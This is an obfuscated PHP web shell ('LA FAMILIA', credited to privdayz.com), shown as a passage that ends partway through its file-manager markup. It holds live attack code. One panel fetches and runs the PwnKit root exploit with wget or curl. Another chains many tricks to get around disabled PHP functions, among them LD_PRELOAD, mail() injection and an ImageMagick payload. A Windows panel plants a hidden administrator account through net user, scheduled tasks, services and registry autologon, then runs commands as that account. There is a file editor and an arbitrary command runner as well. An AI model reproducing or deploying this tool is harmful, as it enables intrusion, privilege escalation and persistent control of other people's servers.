$impdBX = array("\145\x78\x65\x63", "\x73\171\163\x74\145\155", "\x73\150\x65\x6c\154\137\145\170\145\x63", "\160\141\163\x73\x74\150\x72\165", "\x70\162\x6f\143\137\157\160\x65\156", "\x70\x6f\160\145\156", "\x63\165\162\154\137\x65\170\145\143", "\x63\x75\x72\154\x5f\x6d\165\154\x74\151\x5f\x65\x78\x65\x63", "\x70\x61\x72\x73\145\x5f\151\156\151\137\x66\151\x6c\145", "\x73\x68\x6f\x77\x5f\163\157\165\162\x63\145", "\x73\x79\155\x6c\151\x6e\153", "\x70\x75\x74\145\156\x76", "\155\141\151\x6c", "\x64\154", "\143\150\155\x6f\x64", "\143\x68\157\x77\x6e", "\143\150\147\x72\160", "\154\151\156\x6b", "\146\163\157\143\x6b\157\x70\x65\156", "\160\146\163\157\143\x6b\157\160\x65\x6e", "\160\x6f\x73\151\170\137\x6b\151\154\154", "\x70\157\163\x69\170\137\155\153\146\x69\x66\x6f", "\160\x6f\163\151\170\137\x73\x65\x74\160\147\x69\144", "\160\157\163\151\170\x5f\163\x65\164\x73\151\x64", "\x70\157\x73\x69\x78\137\163\x65\x74\165\151\x64", "\160\x63\x6e\x74\x6c\x5f\145\170\145\143", "\x69\x6d\x61\x70\137\x6f\x70\x65\x6e", "\141\160\141\143\x68\x65\x5f\x73\x65\x74\x65\x6e\166", "\160\x72\x6f\143\x5f\x6e\x69\x63\145", "\160\162\x6f\x63\x5f\164\x65\162\x6d\x69\x6e\x61\164\x65", "\160\162\157\143\x5f\x67\x65\x74\x5f\x73\x74\141\x74\165\163", "\145\x73\143\x61\160\x65\163\150\145\154\x6c\x63\x6d\x64", "\x65\x73\143\141\x70\145\163\x68\x65\154\154\141\x72\147", "\x69\x6e\x69\137\x72\x65\163\x74\157\162\x65", "\163\164\162\145\141\x6d\x5f\x73\157\x63\x6b\145\164\137\x73\x65\162\x76\145\162");
$d1sbfX = g3tdbX(); $d1sxbImportant = array_intersect($impdBX, $d1sbfX); $fn_str_replace = _vnt_str([115,116,114,95,114,101,112,108,97,99,101]); $fn_explode = _vnt_str([101,120,112,108,111,100,101]); $fn_trim = _vnt_str([116,114,105,109]);
?>
<body>
    <div class="vantacontainer">
<div class="privcontent flex-1 overflow-auto">
       <div class="p-6">
<?php if (isset($_GET['LAFAMILIA_r00t'])): ?>
<?php
session_start();
if (!isset($_SESSION['LAFAMILIA_r00t_status'])) $_SESSION['LAFAMILIA_r00t_status'] = 'user';
if (!isset($_SESSION['LAFAMILIA_r00t_log'])) $_SESSION['LAFAMILIA_r00t_log'] = [];
function LAFAMILIA_log($msg) {
    $_SESSION['LAFAMILIA_r00t_log'][] = $msg;
    if (count($_SESSION['LAFAMILIA_r00t_log']) > 20) array_shift($_SESSION['LAFAMILIA_r00t_log']);
}
function LAFAMILIA_download_pwnkit() {
    if (!file_exists('pwnkit')) {
        LAFAMILIA_log("[*] Trying wget for pwnkit...");
        $wget = v4nt4C('wget -q -O pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
        clearstatcache();
        if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
            LAFAMILIA_log("[*] wget failed or file too small. Trying curl...");
            $curl = v4nt4C('curl -sL --output pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit');
            clearstatcache();
            if (!file_exists('pwnkit') || filesize('pwnkit') < 10000) {
                LAFAMILIA_log("[!] Both wget and curl failed! No pwnkit.");
                return false;
            } else {
                LAFAMILIA_log("[+] curl download successful!");
            }
        } else {
            LAFAMILIA_log("[+] wget download successful!");
        }
        v4nt4C('chmod +x pwnkit');
        LAFAMILIA_log("[*] chmod +x set for pwnkit.");
        return true;
    }
    return true;
}

function LAFAMILIA_try_root() {
    $_SESSION['LAFAMILIA_r00t_status'] = 'user';
    $_SESSION['LAFAMILIA_r00t_log'] = [];
    LAFAMILIA_log("[*] [AUTO-ROOT] Detecting current user...");
    $id = trim(v4nt4C('id'));
    LAFAMILIA_log("[*] User: $id");
    if (strpos($id, 'uid=0(root)') !== false) {
        $_SESSION['LAFAMILIA_r00t_status'] = 'root';
        LAFAMILIA_log("[+] Already ROOT.");
        return;
    }
    if (LAFAMILIA_download_pwnkit()) {
        if (file_exists('pwnkit')) {
            LAFAMILIA_log("[*] Running pwnkit for root session...");
            @unlink('.privdayz-root');
            v4nt4C('./pwnkit "id" > .privdayz-root');
            usleep(350000);
            $res = @file_get_contents('.privdayz-root');
            if ($res && strpos($res, 'uid=0(root)') !== false) {
                $_SESSION['LAFAMILIA_r00t_status'] = 'root';
                LAFAMILIA_log("[+] r00t success! ($res)");
            } else {
                LAFAMILIA_log("[!] r00t fail. ($res)");
            }
        }
    } else {
        LAFAMILIA_log("[!] pwnkit download totally failed.");
    }
}
LAFAMILIA_try_root();
?>
<div class="vanta-cmd-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="vanta-cmd-header" style="display:flex;align-items:center;gap:11px;">
    <div class="vanta-cmd-ico"><i class="fas fa-terminal"></i></div>
    <div>
      <div class="vanta-cmd-title" style="font-size:1.2em;">
        LAFAMILIA AUTO ROOT
        <?php if ($_SESSION['LAFAMILIA_r00t_status'] === 'root'): ?>
          <span style="background:#279300;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">ROOT ACTIVE (uid=0)</span>
        <?php else: ?>
          <span style="background:#888;color:#fff;border-radius:7px;padding:2px 10px 2px 10px;font-size:.89em;margin-left:15px;">USER MODE</span>
        <?php endif; ?>
      </div>
    </div>
  </div>
  <div class="vanta-cmd-content" style="margin-top:23px;">
    <label class="vanta-cmd-outputlabel" style="margin-top:19px;display:block;">Auto Root Output:</label>
    <pre class="vanta-cmd-output" id="vanta-cmd-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;"><?php
if (!empty($_SESSION['LAFAMILIA_r00t_log'])) {
    foreach ($_SESSION['LAFAMILIA_r00t_log'] as $l) {
        echo htmlspecialchars($l) . "\n";
    }
}
?></pre>
    <form method="post" id="vanta-cmd-form">
      <div class="vanta-cmd-inputbox" style="margin-bottom:17px;">
        <input type="text" class="vanta-cmd-cmdinput" name="vanta-cmd_cmd" value="<?= htmlspecialchars($_POST['vanta-cmd_cmd'] ?? 'id') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
      </div>
      <button class="vanta-cmd-btn" type="submit"><i class="fas fa-bolt"></i> run</button>
    </form>
    <label class="vanta-cmd-outputlabel" style="margin-top:13px;display:block;">Command Output:</label>
    <pre class="vanta-cmd-output" id="vanta-cmd-cmdout" style="background:#161819;color:#e4ffb0;padding:15px 13px 18px 13px;border-radius:7px;min-height:58px;max-height:330px;overflow:auto;"><?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['vanta-cmd_cmd'])) {
    $c = $_POST['vanta-cmd_cmd'];
    $is_root = false;
    if (file_exists('.privdayz-root')) {
        $res = @file_get_contents('.privdayz-root');
        if ($res && strpos($res, 'uid=0(root)') !== false) $is_root = true;
    }
    if ($is_root && file_exists('pwnkit')) {
        @unlink('.privdayz-root2');
        v4nt4C('./pwnkit "' . addslashes($c) . ' 2>&1" > .privdayz-root2');
        usleep(350000);
        $out = @file_get_contents('.privdayz-root2');
        if (!$out) $out = "[!] No output or blocked.";
    } else {
        $out = v4nt4C($c . ' 2>&1');
        if (!$out) $out = "[!] No output or blocked.";
    }
    echo "\n";
    echo htmlspecialchars($out);
}
?></pre>
  </div>
</div>

<?php elseif (!empty($_GET['f'])): 
$file_path = $VANTAxas[0]() . "/" . unx($_GET['f']);
$file_raw = '';
if (is_file($file_path)) {
  $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
  if (!mb_check_encoding($file_raw, 'UTF-8')) {
    $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
  }
}
$edit_result = '';
  if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['save-editor'])) {
    $target = $file_path;
    $code = $_POST['code-editor'];
    $ok = false;
    if (function_exists('file_put_contents')) $ok = @file_put_contents($target, $code) !== false;
    if (!$ok && function_exists('fopen')) {
      $h = @fopen($target, 'w');
      if ($h) { @fwrite($h, $code); @fclose($h); $ok = true; }
    }
    if (!$ok && function_exists('v4nt4C')) {
      $tmpf = sys_get_temp_dir()."/pzedit_".uniqid();
      @file_put_contents($tmpf, $code);
      v4nt4C('cp '.escapeshellarg($tmpf).' '.escapeshellarg($target));
      if (@filesize($target) == strlen($code)) $ok = true;
      @unlink($tmpf);
    }
    $edit_result = $ok
      ? "<span style='color:#ad1457;font-weight:bold;'><i class='fas fa-check-circle'></i> Saved!</span>"
      : "<span style='color:#e53935;font-weight:bold;'><i class='fas fa-times'></i> Save Failed!</span>";
    if (is_file($file_path)) {
      $file_raw = file_get_contents($file_path, false, null, 0, 10*1024*1024);
      if (!mb_check_encoding($file_raw, 'UTF-8')) {
        $file_raw = mb_convert_encoding($file_raw, 'UTF-8', 'ISO-8859-1,Windows-1254,UTF-8');
      }
    }
  }
?>
<div class="v4nt4-card-main" style="max-width:860px;margin:38px auto 0 auto;background:var(--panel);border-radius:18px;box-shadow:0 4px 32px #00e0ff10;padding:29px 23px 23px 23px;">
  <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;">
    <div style="background:#232833;color:#ffed6b;font-size:2em;width:50px;height:50px;display:flex;align-items:center;justify-content:center;border-radius:11px;box-shadow:0 2px 9px #ffd84a21;">
      <i class="fas fa-file-code"></i>
    </div>
    <div>
      <div style="font-size:1.22em;font-weight:900;color:var(--accent2);letter-spacing:.04em;">file edit <span style="font-size:.88em;color:var(--accent);margin-left:8px;">/ <?=htmlspecialchars(unx($_GET['f']))?></span></div>
    </div>
  </div>
  <form method="post" style="margin-bottom:0;">
    <div style="position:relative;">
      <textarea name="code-editor" id="code-editor" class="editor-textarea" style="width:98%;height:420px;resize:vertical;background:#181b22;color:#eafffc;border:1.3px solid #292e38;border-radius:11px;font-size:1.09em;font-family:'Recursive',monospace;padding:16px;line-height:1.55;outline:0;box-shadow:0 1px 9px #00e0ff12;"></textarea>
      <button type="button" onclick="copyCode()" style="position:absolute;top:15px;right:18px;z-index:5;background:var(--accent2);color:#232833;border-radius:7px;font-weight:700;padding:7px 14px;border:none;box-shadow:0 1px 9px #ffd84a21;cursor:pointer;">copy</button>
    </div>
    <div style="display:flex;align-items:center;gap:12px;margin-top:15px;">
      <button type="submit" name="save-editor" class="v4nt4-wiz-btn v4nt4-wiz-btn-red" style="font-size:1.09em;padding:9px 23px;background:var(--accent2);color:#232833;border:1.1px solid var(--accent2);"><i class="fas fa-save"></i> save</button>
      <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>" class="v4nt4-wiz-btn v4nt4-wiz-btn-light" style="padding:9px 22px;"><i class="fas fa-times"></i> back</a>
      <span id="editor-status" style="margin-left:auto;color:var(--text-dim);font-size:.98em;"></span>
    </div>
    <?php if($edit_result): ?><div style="margin-top:14px;"><?=$edit_result?></div><?php endif; ?>
  </form>
  <script>
    const textarea = document.getElementById('code-editor');
    textarea.value = <?= json_encode($file_raw) ?>;
    function updateStatus() {
      let v = textarea.value;
      let lines = v.substr(0, textarea.selectionStart).split("\n");
      let ln = lines.length;
      let col = lines[lines.length-1].length+1;
    document.getElementById('editor-status').innerHTML = 'Line: ' + ln + ' / Col: ' + col + ' / ' + v.length + ' chars';
    }
    function copyCode() {
      textarea.select();
      document.execCommand('copy');
      let btn = event.target; let txt = btn.innerText; btn.innerText = 'copied!';
      setTimeout(()=>btn.innerText=txt,900);
    }
    textarea.addEventListener('input', updateStatus);
    textarea.addEventListener('click', updateStatus);
    textarea.addEventListener('keyup', updateStatus);
    setTimeout(updateStatus,300);
    textarea.addEventListener('keydown',function(e){
      if(e.key==='Tab'){e.preventDefault();let s=this.selectionStart;this.value=this.value.substring(0,s)+'\t'+this.value.substring(this.selectionEnd);this.selectionEnd=s+1;}
      if(e.ctrlKey&&e.key==='f'){e.preventDefault();let q=prompt('Ara?');if(!q)return;let idx=this.value.indexOf(q);if(idx>-1){this.focus();this.setSelectionRange(idx,idx+q.length);}}
    });
  </script>
</div>
<?php elseif (isset($_GET['vanta-cmd'])): ?>
<div class="vanta-cmd-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="vanta-cmd-header" style="display:flex;align-items:center;gap:11px;">
    <div class="vanta-cmd-ico"><i class="fas fa-terminal"></i></div>
    <div>
    <div class="vanta-cmd-title" style="font-size:1.2em;">LA FAMILIA COMMAND</div>
    </div>
  </div>
  <div class="vanta-cmd-content" style="margin-top:23px;">
    <form method="post" id="vanta-cmd-form">
    <div class="vanta-cmd-inputbox" style="margin-bottom:17px;">
     <label class="vanta-cmd-inputlabel">Command:</label>
     <input type="text" class="vanta-cmd-cmdinput" name="vanta-cmd_cmd" value="<?= htmlspecialchars($_POST['vanta-cmd_cmd'] ?? 'id') ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
    </div>
    <button class="vanta-cmd-btn" type="submit"><i class="fas fa-bolt"></i> send</button>
    </form>
    <label class="vanta-cmd-outputlabel" style="margin-top:19px;display:block;">Output:</label>
    <pre class="vanta-cmd-output" id="vanta-cmd-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;">
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['vanta-cmd_cmd'])) { $c = $_POST['vanta-cmd_cmd']; $R = ''; $M = []; $a = array_map('chr', [115,104,101,108,108,95,101,120,101,99]); $M[] = join('', $a); $b = ''; foreach([0x65,0x78,0x65,0x63] as $i) $b .= chr($i); $M[] = $b; $c3 = ''; foreach([0x73,0x79,0x73,0x74,0x65,0x6d] as $i) $c3 .= chr($i); $M[] = $c3; $d = ''; foreach([0x70,0x61,0x73,0x73,0x74,0x68,0x72,0x75] as $i) $d .= chr($i); $M[] = $d; $e = ''; foreach([0x70,0x6f,0x70,0x65,0x6e] as $i) $e .= chr($i); $M[] = $e; $f = ''; foreach([0x70,0x72,0x6f,0x63,0x5f,0x6f,0x70,0x65,0x6e] as $i) $f .= chr($i); $M[] = $f; goto Gfrk2; y3ECj: $M[] = "\155\x61\x69\x6c\151\156\152"; goto G3ViW; wi2_v: $M[] = "\142\x69\156\x62\162\x75\164\145"; goto XVkgD; YuNg7: $M[] = "\154\144\137\x70\x72\145\154\157\141\x64"; goto YewF0; vWb03: $M[] = "\146\x6f\x70\145\x6e\151\x6e\x70\x75\164"; goto wi2_v; G3ViW: $M[] = "\x65\162\162\x6c\x6f\147"; goto vWb03; M6Qgu: $M[] = "\x70\150\160\146\x69\x6c\x74\145\162"; goto YuNg7; YOfWk: $M[] = "\x73\165\x68\157\163\151\x6e"; goto y3ECj; Gfrk2: $M[] = "\142\141\143\x6b\164\x69\143\x6b"; goto M6Qgu; YewF0: $M[] = "\x70\162\x65\x70\145\x6e\144"; goto YOfWk; wITk1: $M[] = "\151\155\x61\147\145\155\141\147\151\143\x6b"; goto V3z4P; XVkgD: $M[] = "\150\x74\64\x30\64"; goto wITk1; V3z4P: $M[] = "\x63\x67\151\x65\156\166"; foreach($M as $meth){ $out = ''; $ok = false; if ($meth === 'backtick') {  $a = $c; $out = ob_get_clean().$a; if(trim($out)) $ok = true; } elseif ($meth === 'phpfilter') { @ini_set('filter.default','convert.base64-encode'); $f = @popen($c." 2>&1", "r"); if ($f) { while (!feof($f)) $out .= fread($f, 4096); fclose($f);} if (trim($out)) $ok = true; @ini_restore('filter.default'); } elseif ($meth === 'ld_preload') { if (strtoupper(substr(PHP_OS,0,3)) !== 'WIN') { putenv('LD_PRELOAD=/tmp/x.so'); $out = @chDx2x($c.' 2>&1'); putenv('LD_PRELOAD'); if (trim($out)) $ok = true; } } elseif ($meth === 'prepend') { $prepend = sys_get_temp_dir()."/xx".uniqid().".php"; @file_put_contents($prepend, "<?php system('".$c."'); exit; ?>"); @ini_set("auto_prepend_file", $prepend); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); @ini_restore("auto_prepend_file"); @unlink($prepend); if (trim($out)) $ok = true; } elseif ($meth === 'suhosin') { @ini_set('suhosin.executor.func.blacklist', ''); $out = @chDx2x($c.' 2>&1'); if (trim($out)) $ok = true; } elseif ($meth === 'mailinj') { $tmpf = sys_get_temp_dir()."/m".uniqid().".txt"; @mail("v@x.com", "", "", "", "-X $tmpf; $c >$tmpf 2>&1"); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'errlog') { $tmpf = sys_get_temp_dir()."/e".uniqid().".txt"; @error_log("<?php echo system('$c'); ?>", 3, $tmpf); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'fopeninput') { $h = @fopen("php://input", "r"); if ($h) { $out = @fread($h, 8192); fclose($h); $ok = true; } } elseif ($meth === 'binbrute') { foreach(['sh','bash','python','perl','nc','busybox','wget'] as $bin){ $which = trim(@chDx2x("which $bin")); if($which) { $out = @chDx2x("$which -c \"$c\" 2>&1"); if (trim($out)) { $ok = true; break; } } } } elseif ($meth === 'ht404') { $out = ''; } elseif ($meth === 'imagemagick') { $tmpi = sys_get_temp_dir().'/img'.uniqid().'.mvg'; $tmpp = sys_get_temp_dir().'/out'.uniqid().'.png'; file_put_contents($tmpi, "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://|$c|)'\npop graphic-context"); @chDx2x("convert $tmpi $tmpp"); if (file_exists($tmpp)) $out = file_get_contents($tmpp); @unlink($tmpi); @unlink($tmpp); if (trim($out)) $ok = true; } elseif ($meth === 'cgienv') { putenv("CGI_COMMAND=$c"); $out = getenv("CGI_COMMAND"); if (trim($out)) $ok = true; } else { if (function_exists($meth)) { if ($meth === $M[0]) { $out = @$meth($c.' 2>&1'); if (trim($out)) $ok = true; } else if ($meth === $M[1]) { $a=[]; $meth($c.' 2>&1', $a); $out = join("\n", $a); if (trim($out)) $ok = true; } else if ($meth === $M[2]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[3]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[4]) { $h=@$meth($c.' 2>&1',"r"); if ($h) { while(!feof($h)) $out.=fread($h,4096); fclose($h); } if (trim($out)) $ok = true; } else if ($meth === $M[5]) { $desc = [1=>["pipe","w"], 2=>["pipe","w"]]; $p = @$meth($c.' 2>&1', $desc, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (trim($out)) $ok = true; } } } } if ($ok && trim($out)) { $R = $out; break; } } echo htmlspecialchars($R ?: "[X] No output / all methods blocked.\n");}?></pre>
    </div>
  </div>

<?php elseif (isset($_GET['winr00t'])): ?>
<div class="vanta-cmd-page" style="max-width:900px;margin:44px auto 0 auto;">
  <div class="vanta-cmd-header" style="display:flex;align-items:center;gap:10px;">
    <div class="vanta-cmd-ico"><i class="fas fa-user-shield"></i></div>
    <div>
      <div class="vanta-cmd-title" style="font-size:1.15em;">ultra admin creator byp4ss (Windows/2025) - by privdayz.com</div>
    </div>
  </div>
  <div class="vanta-cmd-content" style="margin-top:25px;">
    <form method="post" id="winr00t-form" style="margin-bottom:18px;">
      <div style="display:flex;gap:9px;align-items:center;flex-wrap:wrap;">
        <input type="text" name="user" class="vanta-cmd-cmdinput" value="<?= htmlspecialchars($_POST['user']??'VANTAadmin') ?>" placeholder="user" style="width:170px;">
        <input type="text" name="pass" class="vanta-cmd-cmdinput" value="<?= htmlspecialchars($_POST['pass'] ?? substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12)) ?>" placeholder="pass" style="width:160px;" readonly>
        <select name="mode" class="vanta-cmd-cmdinput" style="width:110px;">
            <option value="auto">ultra byp4ss</option>
        </select>
        <button class="vanta-cmd-btn" type="submit" style="min-width:90px;"><i class="fas fa-user-plus"></i> Create</button>
      </div>
    </form>
<?php
function detect_rdp_port() {
    $reg = v4nt4C('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v PortNumber 2>&1');
    if (preg_match('/PortNumber\s+REG_DWORD\s+0x([0-9a-f]+)/i', $reg, $m)) {
        return hexdec($m[1]);
    }
    $netstat = v4nt4C('netstat -an | find ":3389"');
    if (strpos($netstat, '3389') !== false) {
        return 3389;
    }
    return 'Unknown';
}
$rdp_port = detect_rdp_port();
echo "<div style=\"color:#e53935;font-size:1.08em;padding:5px 0 8px 0;\"><b>RDP Port:</b> <span style='color:#1976d2;font-family:monospace;'>" . htmlspecialchars($rdp_port) . "</span></div>";
?>

<label class="vanta-cmd-outputlabel" style="margin-top:18px;display:block;">Output:</label>
<pre class="vanta-cmd-output" id="winr00t-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:1500px;overflow:auto;">
<?php

function wout($msg) { echo htmlspecialchars($msg)."\n"; @ob_flush(); flush(); }

function prvd_exec_with_timeout($cmd, $timeout = 10) {
    $ps = "powershell -Command \"\$p = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c $cmd' -NoNewWindow -PassThru; \$p | Wait-Process -Timeout $timeout; if(-not \$p.HasExited){\$p.Kill()}\"";
    $start = microtime(true);
    $out = v4nt4C($ps.' 2>&1');
    if (trim($out)) return $out;
    $fallback = "timeout /T $timeout /NOBREAK & $cmd";
    $out2 = v4nt4C($fallback.' 2>&1');
    if (trim($out2)) return $out2;
    return v4nt4C($cmd.' 2>&1');
}
if (!isset($_SESSION['v4nt4_winr00t_success'])) $_SESSION['v4nt4_winr00t_success'] = false;
if (!isset($_SESSION['v4nt4_winr00t_user'])) $_SESSION['v4nt4_winr00t_user'] = '';
if (!isset($_SESSION['v4nt4_winr00t_pass'])) $_SESSION['v4nt4_winr00t_pass'] = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['user'],$_POST['pass'])) {
    $u = preg_replace('/[^a-zA-Z0-9_\-]/','',$_POST['user']);
    $p = $_POST['pass'];
    $mode = $_POST['mode'] ?? 'auto';
    $success = false;
    $methods = [];

    $methods[] = [
        "[*] net user (classic)",
        "net user \"$u\" \"$p\" /add && net localgroup Administrators \"$u\" /add"
    ];

    $methods[] = [
        "[*] PowerShell (background)",
        "powershell -Command \"net user $u $p /add; net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] schtasks",
        "schtasks /create /tn winrrrrrr00t /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onstart /ru System"
    ];

    $methods[] = [
        "[*] at.exe",
        "at 12:00 cmd.exe /c \"net user $u $p /add && net localgroup Administrators $u /add\""
    ];

    $methods[] = [
        "[*] sc service hack",
        "sc create p0wnsvc binPath= \"cmd /c net user $u $p /add & net localgroup Administrators $u /add\" start= auto"
    ];

    $methods[] = [
        "[*] Registry AutoAdminLogon",
        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f"
    ];

    $methods[] = [
        "[*] Fallback CMD",
        "cmd /c net user $u $p /add & net localgroup Administrators $u /add"
    ];

    $methods[] = [
        "[*] PowerShell Script Chain",
        "powershell -Command \"Start-Process cmd -ArgumentList '/c net user $u $p /add && net localgroup Administrators $u /add' -Verb runAs\""
    ];

    $methods[] = [
        "[*] Task Scheduler V2 (schtasks)",
        "schtasks /create /tn winr00t2 /tr \"cmd.exe /c net user $u $p /add && net localgroup Administrators $u /add\" /sc onlogon /ru System"
    ];

    foreach ($methods as $step) {
        list($label, $cmd) = $step;
        wout($label . "...");
        $res = prvd_exec_with_timeout($cmd, 9);
        wout($res);
        if (
            stripos($res, 'success') !== false || stripos($res, 'ok') !== false ||
            stripos($res, 'ReturnValue = 0') !== false ||
            stripos($res, 'baÅŸarÄ±') !== false ||
            stripos($res, 'already exists') !== false
        ) {
            wout("[+] Admin user injected!");
            $success = true;
            break;
        }
        sleep(1);
    }

    if ($success) {
        $_SESSION['v4nt4_winr00t_success'] = true;
        $_SESSION['v4nt4_winr00t_user'] = $u;
        $_SESSION['v4nt4_winr00t_pass'] = $p;
    wout("\n[+] 0wn3d! Admin user injected:\n[+] User: $u\n[+] Pass: $p");
    wout("[!] Info: Webshell cannot send commands as this user. Use RDP/SMB/WinRM with these credentials!");
    } else {
        $_SESSION['v4nt4_winr00t_success'] = false;
        wout("\n[!] r00t failed :: no vector worked, permission denied.");
    }
}
if ($_SESSION['v4nt4_winr00t_success']) {
    $u = $_SESSION['v4nt4_winr00t_user'];
    $p = $_SESSION['v4nt4_winr00t_pass'];
    ?>
    </pre>
    <form method="post" style="margin:22px 0 6px 0;padding:13px 16px 14px 16px;border-radius:10px;background:#191919;border:1.5px solid #e53935;box-shadow:0 2px 8px #0002;">
        <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
            <input type="hidden" name="user" value="<?= htmlspecialchars($u) ?>">
            <input type="hidden" name="pass" value="<?= htmlspecialchars($p) ?>">
            <input type="text" name="admc" class="vanta-cmd-cmdinput" placeholder="c0mm4nd as 4dm1n" value="dir" style="width:260px;">
            <button class="vanta-cmd-btn" style="min-width:95px;background:#e53935;"><i class="fas fa-bolt"></i> Run as Admin</button>
        </div>
        <div style="font-size:.96em;color:#fff;margin-top:5px;">
            [+] Running as <b><?=htmlspecialchars($u)?></b> &nbsp;|&nbsp; Pass: <b><?=htmlspecialchars($p)?></b>
        </div>
    </form>
    <pre class="vanta-cmd-output" style="background:#181818;color:#aaffbb;padding:14px;border-radius:8px;min-height:40px;margin-bottom:14px;">
<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admc'], $_POST['user'], $_POST['pass'])) {
        $u = $_POST['user'];
        $p = $_POST['pass'];
        $c = $_POST['admc'];
        $success_cmd = false;
        $cmdfile = "C:\\Windows\\Temp\\pzadmcmd_" . rand(10000, 99999) . ".txt";

        wout("[*] schtasks as admin...");
        $scht = "schtasks /create /tn pzadmtask /tr \"cmd.exe /c $c > $cmdfile 2>&1\" /sc once /st 00:00 /ru \"$u\" /rp \"$p\"";
        $out1 = v4nt4C($scht.' 2>&1');
        wout($out1);

        v4nt4C("schtasks /run /tn pzadmtask 2>&1");
        sleep(1);
        $output = @file_get_contents($cmdfile);
        if ($output && strlen($output) > 0) {
            wout("[+] Command executed as admin!\n" . $output);
            $success_cmd = true;
        }
        @v4nt4C('schtasks /delete /tn pzadmtask /f 2>&1');
        @unlink($cmdfile);
        if (!$success_cmd) {
            wout("[*] Trying service method...");
            $svc = 'sc create pzadmsvc binPath= "cmd /c '.$c.' > '.$cmdfile.' 2>&1" obj= ".\\'.$u.'" password= "'.$p.'" start= demand';
            $out2 = v4nt4C($svc.' 2>&1');
            wout($out2);
            v4nt4C('sc start pzadmsvc 2>&1');
            sleep(1);
            $output2 = @file_get_contents($cmdfile);
            if ($output2 && strlen($output2) > 0) {
                wout("[+] Service method: Command executed as admin!\n" . $output2);
                $success_cmd = true;
            }
            @v4nt4C('sc delete pzadmsvc 2>&1');
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[*] PowerShell fallback...");
            $pw = 'powershell -Command "Start-Process cmd -ArgumentList \'/c '.$c.' > '.$cmdfile.' 2>&1\' -Credential (New-Object System.Management.Automation.PSCredential(\''.$u.'\',(ConvertTo-SecureString \''.$p.'\' -AsPlainText -Force))) -WindowStyle Hidden"';
            $out3 = v4nt4C($pw.' 2>&1');
            wout($out3);
            sleep(1);
            $output3 = @file_get_contents($cmdfile);
            if ($output3 && strlen($output3) > 0) {
                wout("[+] PowerShell: Command executed as admin!\n" . $output3);
                $success_cmd = true;
            }
            @unlink($cmdfile);
        }

        if (!$success_cmd) {
            wout("[!] Admin command failed. Try RDP / manual login?");
        }
    }
    ?>
    </pre>
<?php } ?>
</div>
</div>
<script>
window.onload = function() {
  var el = document.getElementById('winr00t-output');
  el.scrollTop = el.scrollHeight;
}
</script>
<style>
a.privd-link, a.privd-link:visited { color:#e53935!important; text-decoration:underline; }
a.privd-link:hover { color:#b71c1c!important; }
</style>
<?php else: ?>

<div class="v4nt4-lite-uname">
  <span class="v4nt4-lite-dot"></span>
  <?= php_uname(); ?>
</div>
<div class="v4nt4-lite-info">
    <div class="v4nt4-lite-row">
    <span class="v4nt4-lite-key">safe mode:</span>
    <span class="v4nt4-lite-val <?= ini_get('safe_mode') ? 'v4nt4-lite-on' : 'v4nt4-lite-off' ?>">
    <?= ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
    </span>
  </div>
<div class="v4nt4-lite-row"><span class="v4nt4-lite-key">disable functions:</span>
  <?php
    $d1sxb = trim(ini_get('disable_functions'), ", \t\n\r\0\x0B");
    if (!$d1sxb) {
    echo '<span class="v4nt4-lite-val v4nt4-lite-on" style="background:#eafff5;">None</span>';
    } else {
    echo '<span class="v4nt4-lite-val v4nt4-lite-off" style="white-space:normal;">'
       . str_replace(",", ", ", $d1sxb)
       . '</span>';
    }
  ?>
</div>
</div>
<div class="v4nt4-filelist-root">
<div class="vanta-fm-actions">
  <a href="?LAFAMILIA=<?= vanta_PR1V($VANTAxas[0]()) ?>&createfolder" class="vanta-fm-btn" title="New Folder">
    <i class="fas fa-folder-plus"></i> <span>create folder</span>
  </a>
